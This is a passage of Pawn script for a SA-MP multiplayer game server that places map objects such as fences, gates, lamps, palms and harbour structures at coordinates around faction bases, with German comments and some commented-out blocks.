CreateDynamicObject(983, 1542.93262, -1617.72290, 16.59067,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1542.93262, -1617.72290, 17.84504,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1546.31641, -1617.71741, 16.58888,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(983, 1546.31641, -1617.71741, 17.84900,   0.00000, 0.00000, -89.99996);
CreateDynamicObject(3881, 1545.03320, -1620.60620, 14.34547,   0.00000, 0.00000, 90.00001);
CreateDynamicObject(4642, 1544.14453, -1634.79419, 14.23454,   0.00000, 0.00000, -89.99998);
CreateDynamicObject(3928, 1549.78601, -1644.05859, 27.39426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, 1548.79468, -1707.20361, 27.39426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, 1564.83960, -1695.31323, 27.39426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3928, 1564.68665, -1656.62183, 27.39426,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1560.87866, -1698.84973, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1560.90771, -1692.02686, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1568.55542, -1691.96167, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1568.43921, -1698.85962, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1552.53894, -1703.88562, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1552.52356, -1710.69019, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1544.83228, -1710.68823, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1544.86414, -1703.91858, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1560.75391, -1653.29883, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1560.75793, -1660.09790, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1568.34167, -1660.14612, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1568.36597, -1653.31299, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1553.53052, -1640.77100, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1553.53613, -1647.58813, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1545.89490, -1640.77441, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1215, 1545.79517, -1647.59912, 27.38122,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(1537, 1563.43616, -1667.32227, 27.35638,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(1537, 1564.92249, -1667.31140, 27.35638,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(1537, 1558.48926, -1637.07959, 12.52685,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(1537, 1559.97168, -1637.04480, 12.52685,   0.00000, 0.00000, 180.00000);
MVTor3 = CreateObject(968, 1544.68250, -1630.83728, 13.15227,   0.00000, -90.00000, -90.00000);

// San News Base
CreateDynamicObject(966, -302.45389, 1507.61121, 74.33480,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(984, -308.88620, 1507.67322, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -321.65979, 1507.67651, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -334.42682, 1507.68579, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -347.22687, 1507.72156, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -360.04123, 1507.70239, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -372.80545, 1507.66663, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -385.56937, 1507.67468, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -393.56931, 1507.69421, 74.99536,   0.00000, 0.00000, 89.99995);
CreateDynamicObject(984, -399.94504, 1514.10034, 74.99536,   0.00000, 0.00000, -0.00004);
CreateDynamicObject(984, -399.97418, 1526.83728, 74.99536,   0.00000, 0.00000, -0.00004);
CreateDynamicObject(984, -399.98892, 1539.59778, 74.99536,   0.00000, 0.00000, -0.00004);
CreateDynamicObject(984, -399.99982, 1552.35901, 74.99536,   0.00000, 0.00000, -0.00004);
CreateDynamicObject(984, -396.51987, 1564.13843, 74.99536,   0.00000, 0.00000, -32.94004);
CreateDynamicObject(984, -389.55914, 1574.88367, 74.99536,   0.00000, 0.00000, -32.94004);
CreateDynamicObject(984, -382.60098, 1585.61328, 74.99536,   0.00000, 0.00000, -32.94004);
CreateDynamicObject(984, -290.46838, 1511.56470, 74.99536,   0.00000, 0.00000, 128.09993);
CreateDynamicObject(984, -280.60641, 1519.70813, 74.99536,   0.00000, 0.00000, 130.79990);
CreateDynamicObject(984, -270.94022, 1528.08130, 74.99536,   0.00000, 0.00000, 130.79990);
CreateDynamicObject(984, -261.27753, 1536.44604, 74.99536,   0.00000, 0.00000, 130.79990);
CreateDynamicObject(984, -260.91257, 1545.20789, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -269.80753, 1554.41089, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -278.70490, 1563.57056, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -287.57782, 1572.75073, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -296.46082, 1581.94885, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -305.34897, 1591.12585, 74.99536,   0.00000, 0.00000, 224.10002);
CreateDynamicObject(984, -314.68158, 1599.74609, 74.99536,   0.00000, 0.00000, 230.52010);
//
// Ordnungsamt Base
CreateDynamicObject(987, 2212.39209, 2032.50439, 9.73687,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2221.43115, 2032.46387, 9.73687,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2230.46680, 2032.41736, 9.73687,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2239.47510, 2032.43591, 9.73687,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(966, 2255.92212, 2032.58643, 9.76030,   0.00000, 0.00000, 180.00000);
CreateDynamicObject(987, 2243.97632, 2032.45447, 9.73687,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(11292, 2310.05542, 2037.49792, 11.23435,   0.00000, 0.00000, 269.75000);
//
// LCM Base
CreateDynamicObject(3749, 2107.47168, 1385.36365, 15.63260,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(3749, 2089.49658, 1433.19568, 15.63260,   0.00000, 0.00000, 90.00003);
CreateDynamicObject(987, 2117.33496, 1384.40417, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2129.28564, 1384.39185, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2141.18701, 1384.40576, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2153.12891, 1384.38000, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2165.05396, 1384.36829, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2177.06787, 1384.24622, 9.80123,   0.00000, 0.00000, 90.00001);
CreateDynamicObject(987, 2088.25000, 1395.74146, 9.80120,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2088.12012, 1383.93896, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2088.24609, 1407.56030, 9.80120,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2088.25269, 1419.48816, 9.80120,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2088.25732, 1425.50403, 9.80120,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2090.72852, 1454.07007, 9.80120,   0.00000, 0.00000, 270.00000);
CreateDynamicObject(987, 2176.00122, 1418.18811, 9.80123,   0.00000, 0.00000, 90.00001);
CreateDynamicObject(987, 2176.00439, 1430.12134, 9.80123,   0.00000, 0.00000, 90.00001);
CreateDynamicObject(987, 2175.99658, 1439.13599, 9.80123,   0.00000, 0.00000, 90.00001);
CreateDynamicObject(987, 2141.31226, 1452.99353, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2132.32031, 1453.01672, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2123.34619, 1453.01831, 9.80123,   0.00000, 0.00000, 0.00000);
CreateDynamicObject(987, 2117.37891, 1453.02209, 9.80123,   0.00000, 0.00000, 0.00000);
//


LVPDtorneu = CreateDynamicObject(10184, 2334.78613, 2443.51074, 7.25360,   0.00000, 0.00000, -30.06001);

// Hitman Base
CreateDynamicObject(3749, 1879.46423, 702.76587, 15.63346,   0.00000, 0.00000, -90.00000);
CreateDynamicObject(987, 1879.97717, 693.01929, 9.79607,   0.00000, 0.00000, -89.99995);
CreateDynamicObject(987, 1878.64929, 723.80060, 9.79607,   0.00000, 0.00000, -89.99995);
CreateDynamicObject(987, 1971.82056, 704.44257, 9.79607,   0.00000, 0.00000, -89.99995);
CreateDynamicObject(987, 1971.78918, 713.41858, 9.79607,   0.00000, 0.00000, -89.99995);
//

fbitor = CreateDynamicObject(10184, -1631.79822, 688.39423, 8.69935,   0.00000, 0.00000, -90.00004, -1, -1, -1, 250.0);



//RIFAS ZAUN
CreateDynamicObject(10841, 2263.3999023438, -2254.3999023438, 20.200000762939, 0, 0, 314.45935058594);


/*
    //Stadthalle Die glassscheiben
    CreateDynamicObject(1649, 1492.1999511719, -1751.5, 16.10000038147, 0, 0, 0);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 19.39999961853, 0, 0, 0);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 22.700000762939, 0, 0, 0);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 26, 0, 0, 0);
    CreateDynamicObject(1649, 1486.6999511719, -1751.5, 16.10000038147, 0, 0, 0);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 19.39999961853, 0, 0, 0);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 22.700000762939, 0, 0, 0);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 26, 0, 0, 0);
    CreateDynamicObject(1649, 1481.1999511719, -1751.5, 19.39999961853, 0, 0, 0);
    CreateDynamicObject(1649, 1481.19921875, -1751.5, 22.700000762939, 0, 0, 0);
    CreateDynamicObject(1649, 1481.19921875, -1751.5, 26, 0, 0, 0);
    CreateDynamicObject(1649, 1475.6999511719, -1751.5, 16.10000038147, 0, 0, 0);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 19.39999961853, 0, 0, 0);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 22.700000762939, 0, 0, 0);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 26, 0, 0, 0);
    CreateDynamicObject(1649, 1470.1999511719, -1751.5999755859, 16.10000038147, 0, 0, 0);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 19.39999961853, 0, 0, 0);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 22.700000762939, 0, 0, 0);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 26, 0, 0, 0);
    CreateDynamicObject(1649, 1492.1999511719, -1751.5, 16.10000038147, 0, 0, 180);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 19.39999961853, 0, 0, 180);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 22.700000762939, 0, 0, 180);
    CreateDynamicObject(1649, 1492.19921875, -1751.5, 26, 0, 0, 180);
    CreateDynamicObject(1649, 1486.6999511719, -1751.5, 16.10000038147, 0, 0, 180);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 19.39999961853, 0, 0, 180);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 22.700000762939, 0, 0, 180);
    CreateDynamicObject(1649, 1486.69921875, -1751.5, 26, 0, 0, 180);
    CreateDynamicObject(1649, 1481.1999511719, -1751.5, 19.39999961853, 0, 0, 180);
    CreateDynamicObject(1649, 1481.19921875, -1751.5, 22.700000762939, 0, 0, 180);
    CreateDynamicObject(1649, 1481.19921875, -1751.5, 26, 0, 0, 180);
    CreateDynamicObject(1649, 1475.6999511719, -1751.5, 16.10000038147, 0, 180, 180);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 19.39999961853, 0, 0, 180);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 22.700000762939, 0, 180, 180);
    CreateDynamicObject(1649, 1475.69921875, -1751.5, 26, 0, 0, 180);
    CreateDynamicObject(1649, 1470.1999511719, -1751.5999755859, 16.10000038147, 0, 0, 180);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 19.39999961853, 0, 0, 180);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 22.700000762939, 0, 0, 180);
    CreateDynamicObject(1649, 1470.19921875, -1751.599609375, 26, 0, 0, 180);
    CreateDynamicObject(3471, 1478.5, -1749.6999511719, 15.699999809265, 0, 0, 90);
    CreateDynamicObject(3471, 1483.7998046875, -1749.69921875, 15.699999809265, 0, 0, 90);
*/

    //LS Große Straße Palmen Linie mit blumen in der nähe von bank
    CreateDynamicObject(669, 1306.768677, -1547.639893, 12.669865, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(669, 1312.129272, -1527.759033, 12.869863, 0.0000, 0.0000, 0.0000);
    CreateDynamicObject(669, 1322.687744, -1509.135254, 12.869862, 0.0000, 0.0000, 90.0000);
    CreateDynamicObject(669, 1335.822510, -1486.952759, 12.869862, 0.0000, 0.0000, 90.0000);
    CreateDynamicObject(669, 1344.699219, -1459.157349, 12.862068, 0.0000, 0.0000, 90.0000);
    CreateDynamicObject(669, 1348.442505, -1435.367310, 12.869862, 0.0000, 0.0000, 11.2500);
    //

CreateDynamicObject(1232, 1557.8000488281, -1633.1999511719, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1557.9000244141, -1622.5999755859, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1564.3000488281, -1622.5999755859, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1564.1999511719, -1633.1999511719, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1569.6999511719, -1633.1999511719, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1569.0999755859, -1622.5999755859, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1575.5, -1622.5999755859, 14.199999809265, 0, 0, 0);
CreateDynamicObject(1232, 1576.0999755859, -1633.1999511719, 14.199999809265, 0, 0, 0);


/*
//Fahrschule bye  JULIAN
CreateDynamicObject(987, 1289.0999755859, -1785.6999511719, 12.5, 0, 0, 179.25);
CreateDynamicObject(987, 1289, -1797.5999755859, 12.5, 0, 0, 90);
CreateDynamicObject(987, 1289, -1809.5999755859, 12.5, 0, 0, 90);
CreateDynamicObject(987, 1289, -1821.5999755859, 12.5, 0, 0, 90.75);
CreateDynamicObject(987, 1289, -1833.5999755859, 12.5, 0, 0, 90);
CreateDynamicObject(987, 1289.0999755859, -1845.5999755859, 12.5, 0, 0, 90.5);
CreateDynamicObject(987, 1277.1999511719, -1845.5999755859, 12.5, 0, 0, 0);
CreateDynamicObject(3749, 1270, -1844.9000244141, 18.200000762939, 0, 0, 0);
CreateDynamicObject(987, 1252.1999511719, -1845.5, 12.5, 0, 0, 0);
CreateDynamicObject(987, 1240.1999511719, -1845.5999755859, 12.5, 0, 0, 0);
CreateDynamicObject(987, 1228.1999511719, -1845.5, 12.5, 0, 0, 0);
CreateDynamicObject(3749, 1214.1999511719, -1844.9000244141, 18.200000762939, 0, 0, 0);
CreateDynamicObject(987, 1220.1999511719, -1845.5, 12.5, 0, 0, 0);
CreateDynamicObject(987, 1196.4000244141, -1845.4000244141, 12.60000038147, 0, 0, 0);
CreateDynamicObject(987, 1188.8000488281, -1845.4000244141, 12.60000038147, 0, 0, 0);
CreateDynamicObject(987, 1188.8000488281, -1833.5, 12.60000038147, 0, 0, 269.99996948242);
CreateDynamicObject(987, 1188.8000488281, -1821.5, 12.60000038147, 0, 0, 269.99996948242);
CreateDynamicObject(987, 1189, -1809.5999755859, 12.60000038147, 0, 0, 269.99996948242);
*/
//Wheelman
	CreateDynamicObject(984, 1770.8000488281, -2025.9000244141, 13.800000190735, 0, 0, 90);
	CreateDynamicObject(17950, 1808.0999755859, -2023.4000244141, 14.800000190735, 0, 0, 90);
	CreateDynamicObject(17950, 1808.0999755859, -2030.5999755859, 14.800000190735, 0, 0, 89.994506835938);
	CreateDynamicObject(17950, 1808.0999755859, -2037.8000488281, 14.800000190735, 0, 0, 89.994506835938);
	CreateDynamicObject(17950, 1808.0999755859, -2045, 14.800000190735, 0, 0, 89.994506835938);
	CreateDynamicObject(8615, 1807.8000488281, -2049.5, 15.300000190735, 0, 0, 0);
	CreateDynamicObject(987, 1683.5999755859, -2065.8000488281, 12.60000038147, 0, 0, 270);
	CreateDynamicObject(987, 1683.8000488281, -2053.8000488281, 12.60000038147, 0, 0, 269.74450683594);
	CreateDynamicObject(987, 1784.8000488281, -2018.4000244141, 13.10000038147, 0, 0, 180);

//VAGOS//
	CreateDynamicObject(8613, 2791.5, -1621, 14.300000190735, 0, 0, 252);
	CreateDynamicObject(1472, 2793.6000976563, -1624.8000488281, 18.10000038147, 0, 0, 162);
	CreateDynamicObject(1472, 2793.3000488281, -1625.9000244141, 18.89999961853, 0, 0, 161.99340820313);
	CreateDynamicObject(1472, 2793.1000976563, -1626.6999511719, 19.700000762939, 0, 0, 161.99340820313);
	CreateDynamicObject(3934, 2781, -1636.3000488281, 20.39999961853, 0, 0, 270);
	CreateDynamicObject(3749, 2800.3999023438, -1585.9000244141, 15.800000190735, 0, 0, 336);

	vagostor = CreateDynamicObject(980, 2800.6000976563, -1585.5, 12.699999809265, 0, 0, 336);

//GSF TREPPE//
    CreateDynamicObject(12985, 2527.1999511719, -1685.5999755859, 15.800000190735, 0, 0, 90);

/*
// Hafen 1 an der anderen Seite
     CreateDynamicObject(3458, -169.906006, -1785.358765, -1.203387, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3458, -147.863464, -1789.263306, -1.428164, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(3458, -155.607635, -1828.442993, -1.393290, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(3458, -140.066315, -1749.870117, -1.403008, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(3458, -118.190384, -1731.279663, -1.256134, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(3458, -142.605820, -1853.682739, -1.333315, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(10828, -135.702881, -1832.218872, -2.452391, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(10828, -132.119354, -1813.138184, -2.490521, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(10828, -128.915741, -1793.497192, -2.486747, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(10828, -124.224411, -1769.919922, -2.496351, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(10828, -120.116837, -1750.776978, -2.448018, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1461, -145.670425, -1788.136475, 0.901519, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -141.052292, -1763.114746, 0.926675, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -137.107422, -1743.447510, 0.926675, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -99.642639, -1734.827637, 1.073549, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -149.885025, -1806.434204, 0.901519, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -153.238068, -1826.211182, 0.936393, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(1461, -123.582947, -1857.458496, 0.996368, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(5184, -219.255280, -1766.264404, 19.702538, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(5184, -242.773193, -1761.256836, 19.015713, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(3187, -208.763885, -1776.380005, 4.872223, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(2714, -208.681702, -1767.651001, 2.457701, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(8550, -221.425262, -1808.126099, 5.067808, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -199.768417, -1775.765015, 1.516759, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(638, -200.485809, -1781.020874, 1.516759, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(669, -246.720764, -1795.008301, 7.659835, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(669, -237.947906, -1774.729858, 4.999296, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(970, -200.132965, -1784.498047, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -200.921524, -1788.499023, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -201.732025, -1792.569702, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -202.529053, -1796.565552, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -203.357315, -1800.639404, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -204.141205, -1804.647339, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -204.924149, -1808.640503, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -205.725708, -1812.739624, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -206.498322, -1816.804321, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -207.328262, -1820.904297, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -208.111160, -1824.978149, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -208.933426, -1829.151855, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -209.473007, -1831.861450, 1.371206, 0.0000, 0.0000, 258.7500);
     CreateDynamicObject(970, -211.927963, -1833.371948, 1.371206, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -216.016541, -1832.566040, 1.371206, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -220.114746, -1831.716919, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -224.270309, -1830.913086, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -228.283478, -1830.123291, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -232.341919, -1829.346680, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -236.517151, -1828.562012, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -240.581451, -1827.786255, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -244.640274, -1826.977783, 1.374410, 0.0000, 0.0000, 168.7500);
     CreateDynamicObject(970, -248.572006, -1825.800537, 1.374410, 0.0000, 0.0000, 157.5000);
     CreateDynamicObject(970, -252.463745, -1824.239746, 1.371206, 0.0000, 0.0000, 157.5000);
     CreateDynamicObject(970, -197.676712, -1773.637817, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -196.886871, -1769.660522, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -195.926178, -1764.787109, 1.374408, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -195.155594, -1760.773315, 1.374408, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -194.359451, -1756.641968, 1.374408, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -193.581192, -1752.629150, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -192.817093, -1748.612793, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -192.007813, -1744.508789, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -191.164688, -1740.436035, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -190.321869, -1736.370239, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -189.489395, -1732.304321, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -188.688690, -1728.250122, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -187.850220, -1724.172241, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -187.073456, -1720.089844, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -186.301270, -1716.078979, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -185.600754, -1712.152710, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -185.040085, -1709.005615, 1.371206, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(970, -186.679504, -1706.583374, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -190.708817, -1705.793213, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -194.769196, -1704.972534, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -198.803589, -1704.151367, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -202.892410, -1703.341064, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -206.918198, -1702.553955, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(970, -211.006500, -1701.731445, 1.371206, 0.0000, 0.0000, 348.7499);
     CreateDynamicObject(638, -198.980865, -1762.132446, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -196.927292, -1751.622070, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -195.143433, -1742.867920, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -193.074493, -1732.727173, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -190.849854, -1721.287598, 1.519963, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -204.422562, -1785.903320, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -205.575211, -1792.153809, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -207.343735, -1801.083618, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -209.129623, -1809.614624, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(638, -211.778656, -1823.270508, 1.516759, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(2587, -206.582870, -1773.165894, 2.022864, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(2588, -205.829422, -1769.378052, 2.558418, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(2599, -205.495224, -1774.545898, 1.286638, 0.0000, 0.0000, 292.5000);
     CreateDynamicObject(1481, -210.262772, -1781.321899, 1.522851, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1481, -211.390625, -1781.101807, 1.522851, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(16151, -212.717422, -1781.659912, 1.211478, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1281, -218.090454, -1791.579590, 1.620107, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1281, -213.093277, -1786.695313, 1.620107, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1281, -210.974442, -1793.356079, 1.620107, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1281, -222.083817, -1784.283569, 1.620107, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1231, -192.457367, -1727.586548, 3.553322, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -190.274261, -1716.381470, 3.550118, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -194.448547, -1737.637329, 3.553322, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -196.061096, -1746.895874, 3.553322, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -197.989304, -1756.316406, 3.553322, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -206.144470, -1795.570801, 3.550118, 0.0000, 0.0000, 0.0000);
     CreateDynamicObject(1231, -207.640366, -1804.556885, 3.550118, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1231, -209.656158, -1814.698975, 3.550118, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1231, -211.921539, -1826.656494, 3.550118, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1646, -218.607574, -1819.992188, 1.157155, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1646, -218.788498, -1822.797607, 1.157155, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1646, -219.276520, -1826.022705, 1.157155, 0.0000, 0.0000, 78.7500);
     CreateDynamicObject(1676, -101.679184, -1732.878906, 1.853202, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(1676, -125.036003, -1858.868286, 1.776021, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3458, -198.437820, -1779.719971, -1.283246, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3458, -169.660339, -1785.475952, -1.307508, 0.0000, 0.0000, 348.7500);
     CreateDynamicObject(3458, -140.484436, -1726.962158, -1.340826, 0.0000, 0.0000, 168.7500);
